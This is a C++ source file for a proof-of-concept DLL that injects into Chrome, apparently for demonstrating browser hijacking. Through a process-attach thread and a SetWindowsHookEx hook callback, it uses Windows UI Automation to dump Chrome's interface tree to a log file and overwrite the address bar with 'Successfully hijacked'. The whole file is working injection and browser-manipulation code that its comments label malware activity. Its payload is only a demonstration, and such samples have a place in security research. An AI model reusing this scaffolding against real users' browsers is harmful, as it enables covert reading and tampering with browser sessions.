#include "dllmain.h"

#pragma data_seg("SHARED")
bool unloadDll = false;
HMODULE hThisDll = nullptr;
HANDLE hRemoteThread = nullptr;
#pragma data_seg()
#pragma comment(linker, "/section:SHARED,RWS")
IUIAutomation* g_pAutomation;

//Entry point function, called after DLL was mapped to memory
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved)
{
	//Detect if the DLL was loaded into chrome.exe
	WCHAR applicationPath[MAX_PATH + 1];
	auto len = GetModuleFileNameW(nullptr, applicationPath, MAX_PATH);
	if (len > 0)
	{
		std::wstring applicationString(applicationPath);
		auto found = applicationString.find_last_of(L"/\\");
		if (applicationString.substr(found + 1) != L"chrome.exe")
		{
			//It wasn't -> do nothing
			return TRUE;
		}
	}
	else
	{
		//Couldn't get process name - exit!
		return TRUE;
	}

	//This is a chrome.exe process, start "hijack" / malware activity
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		//Only start a new thread if there's no existing one
		if (hThisDll == nullptr && lpReserved == nullptr)
		{
			hThisDll = hModule;
			InjectDLL();
		}
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//Called from the process that injected this DLL to make it unload.
void __stdcall UnloadDLL()
{
	unloadDll = true;
}

//This function starts a new thread; asyncThreadFunction is executed inside the thread
void InjectDLL()
{
	hRemoteThread = HANDLE(_beginthread(asyncThreadFunction, 0, nullptr));
}

//This function is used for SetWindowsHookEx injections
//The function is the required callback function
LRESULT __stdcall hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	//Just display some MessageBoxes, to show that the call was successful.
	MessageBoxW(nullptr, L"Test", L"Test", MB_OK);

	//Start the async thread
	if (hRemoteThread == nullptr)
	{
		InjectDLL();
	}

	//Pass on the hook, so other registered hooks continue working
	return CallNextHookEx(nullptr, code, wParam, lParam);
}

//The following functions are required for the UI automation activities

//This function initializes the UI automation "framework"
BOOL InitializeUIAutomation()
{
	CoInitialize(nullptr);
	auto hr = CoCreateInstance(CLSID_CUIAutomation, nullptr,
		CLSCTX_INPROC_SERVER, IID_IUIAutomation,
		reinterpret_cast<void**>(&g_pAutomation));
	return (SUCCEEDED(hr));
}

//This function builds a tree of nodes given a rootNode and level
//A node is represented by an UI element
//The function builds the tree with DFS iteration
HRESULT listTree(int level, IUIAutomationElement* rootNode, IUIAutomationTreeWalker* walker)
{
	HRESULT hr;
	IUIAutomationElement* element = nullptr;
	auto base = std::wstring(level, L'-');

	//Get the first element
	hr = walker->GetFirstChildElement(rootNode, &element);
	if (FAILED(hr) || element == nullptr)
	{
		return hr;
	}

	while (element != nullptr)
	{
		//Is this a control element?
		BOOL isControl;
		hr = element->get_CurrentIsControlElement(&isControl);

		if (FAILED(hr))
		{
			logToFile(base + L"Failed element is control type");
			logToFile(base + L"Error code: " + std::to_wstring(hr));
		}
		else if (isControl)
		{
			//Yes it is -> print it's details
			BSTR controlName;
			BSTR controlType;
			CONTROLTYPEID controlTypeId;
			hr = element->get_CurrentName(&controlName);
			hr += element->get_CurrentLocalizedControlType(&controlType);
			hr += element->get_CurrentControlType(&controlTypeId);

			if (FAILED(hr))
			{
				logToFile(base + L"Failed element control type");
			}
			if (controlName != nullptr)
			{
				logToFile(base + L" NAME: " + static_cast<std::wstring>(controlName));
			}
			if (controlType != nullptr)
			{
				logToFile(base + L" TYPE: " + static_cast<std::wstring>(controlType));
			}
			if (controlTypeId != NULL)
			{
				logToFile(base + L" ID: " + std::to_wstring(controlTypeId));
			}
		}

		//Continue with children of the current element
		listTree(level * 2, element, walker);

		//After that, the next element to be locked at, is it's sibling
		IUIAutomationElement* next = nullptr;
		hr = walker->GetNextSiblingElement(element, &next);
		if (FAILED(hr))
		{
			logToFile(base + L"Failed next element");
			logToFile(base + L"Error code: " + std::to_wstring(hr));
		}
		//Free the memory used for the current element
		SAFE_RELEASE(element);
		//Update the pointer to continue iteration
		element = next;
	}

	return S_OK;
}

//This function uses listTree to build a "full" tree starting from the root element
//The level is used to define the indentation of the printed output
HRESULT buildFullTree(IUIAutomationElement* rootNode)
{
	//Get a TreeWalker object, to parse the UI nodes
	IUIAutomationTreeWalker* walker = nullptr;
	auto hr = g_pAutomation->get_ControlViewWalker(&walker);

	if (FAILED(hr) || walker == nullptr)
	{
		logToFile("Failed walker");
		logToFile("Error code: " + std::to_string(hr));
		return hr;
	}

	//Now build the tree starting with level 1 indentation
	hr = listTree(1, rootNode, walker);
	SAFE_RELEASE(walker);
	return hr;
}

//This is the actual thread function
//It will use the UI automation library to dump all UI elements of chrome
//Then, once it found the address bar, it writes 
//"Successfully hijacked" into it.
void asyncThreadFunction(void*)
{
	logToFile("-------------------------------------");
	logToFile("Injected");

	//Init the UI Automation library
	if (!InitializeUIAutomation())
	{
		logToFile("Failed to initialize UI Automation");
	}

	//Define some elements required later
	IUIAutomationElement* root_element = nullptr;
	IUIAutomationElement* chromeWindow = nullptr;
	IUIAutomationCondition* condition = nullptr;
	IUIAutomationElementArray* foundArray = nullptr;

	//Get the root element
	auto hr = g_pAutomation->GetRootElement(&root_element);
	if (FAILED(hr) || root_element == nullptr)
	{
		logToFile("Failed root element");
		logToFile("Error code: " + std::to_string(hr));
		goto cleanup;
	}

	//As UI automation works on all processes, limit it to chrome
	VARIANT varProp;
	varProp.vt = VT_INT;
	varProp.intVal = GetCurrentProcessId();
	hr = g_pAutomation->CreatePropertyCondition(UIA_ProcessIdPropertyId, varProp, &condition);
	VariantClear(&varProp);

	if (FAILED(hr) || condition == nullptr)
	{
		logToFile("Failed condition");
		logToFile("Error code: " + std::to_string(hr));
		goto cleanup;
	}

	//Find the "real root" element of chrome, it's window
	hr = root_element->FindFirst(TreeScope_Children, condition, &chromeWindow);
	SAFE_RELEASE(condition);

	if (FAILED(hr) || chromeWindow == nullptr)
	{
		logToFile("Failed chrome window");
		logToFile("Error code: " + std::to_string(hr));
		goto cleanup;
	}

	//Get the window name
	BSTR retVal;
	chromeWindow->get_CurrentName(&retVal);
	logToFile("Found chrome window successfully");
	logToFile(retVal);

	//From here on, walk over all children UI elements
	hr = buildFullTree(chromeWindow);
	if (FAILED(hr))
	{
		logToFile("Failed to build component tree");
		logToFile("Error code: " + std::to_string(hr));
		goto cleanup;
	}

	//Create the condition to find the address bar
	VARIANT varProp2;
	varProp2.vt = VT_INT;
	varProp2.intVal = UIA_EditControlTypeId;
	IUIAutomationCondition* editControlCondition = nullptr;
	IUIAutomationElement* foundElement = nullptr;

	hr = g_pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, varProp2, &editControlCondition);

	if (FAILED(hr) || editControlCondition == nullptr)
	{
		logToFile("Failed to edit control condition");
		logToFile("Error code: " + std::to_string(hr));
		goto cleanup;
	}

	//The first element is typically the address bar
	hr = chromeWindow->FindFirst(TreeScope_Descendants, editControlCondition, &foundElement);
	SAFE_RELEASE(editControlCondition);

	if (FAILED(hr) || foundElement == nullptr)
	{
		logToFile("Failed to find edit control element");
		logToFile("Error code: " + std::to_string(hr));
		goto cleanup;
	}

	//Write "Successfully hijacked" into the address bar
	IValueProvider* valueProvider = nullptr;
	foundElement->GetCurrentPattern(UIA_ValuePatternId, reinterpret_cast<IUnknown**>(&valueProvider));
	valueProvider->SetValue(L"Successfully hijacked");


cleanup:
	//Cleanup all used UI elements
	SAFE_RELEASE(root_element);
	SAFE_RELEASE(chromeWindow);
	SAFE_RELEASE(foundArray);
	SAFE_RELEASE(g_pAutomation);

	logToFile("Ejected");
	logToFile("-------------------------------------");


	//Wait for unload -> until flag is set from outside
	while (!unloadDll)
	{
		//This creates some beep sound after everything else finished
		Beep(1000, 1000);
		Sleep(1000L);
	}

	//Unload the DLL
	FreeLibrary(hThisDll);

	//Create possibility to reinject
	hThisDll = nullptr;
	hRemoteThread = nullptr;
}

